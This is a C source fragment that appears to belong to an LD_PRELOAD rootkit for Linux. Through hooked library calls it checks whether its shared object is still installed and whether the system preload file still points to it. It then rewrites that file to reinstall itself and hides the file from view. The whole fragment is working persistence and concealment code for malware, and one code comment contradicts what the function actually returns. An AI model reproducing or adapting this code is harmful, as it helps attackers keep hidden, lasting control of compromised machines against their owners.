int rknomore(void){ // returns 1 if rootkit mia
    DIR *dp;
    struct dirent *dir;
    int status = -1;
    size_t pathlen;

    hook(COPENDIR, CREADDIR);

    dp = call(COPENDIR, INSTALL_DIR);
    if(dp == NULL) return 1;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        if(!strncmp(BDVLSO, dir->d_name, strlen(BDVLSO))){
            status = 1;
        }
    }
    closedir(dp);


    return status;
}

int ld_inconsistent(void){ // returns 1 if something is wrong with the preload file.
    struct stat ldstat;
    int inconsistent = 0, statval;

    hook(C__XSTAT);
    memset(&ldstat, 0, sizeof(stat));
    statval = (long)call(C__XSTAT, _STAT_VER, LDSO_PRELOAD, &ldstat);

    if((statval < 0 && errno == ENOENT) || ldstat.st_size != strlen(SOPATH))
        inconsistent = 1;

    return inconsistent;
}

void reinstall(void){
    /* don't do anything if we don't need to... ((or can't)) */
    if(rknomore() < 0) return;
    if(!ld_inconsistent()) return;

    hook(CFOPEN, CFWRITE);
    FILE *ldfp = call(CFOPEN, LDSO_PRELOAD, "w");

    if(ldfp != NULL){
        call(CFWRITE, SOPATH, strlen(SOPATH), 1, ldfp);
        fflush(ldfp);
        fclose(ldfp);

        hide_path(LDSO_PRELOAD);
    }

    return;
}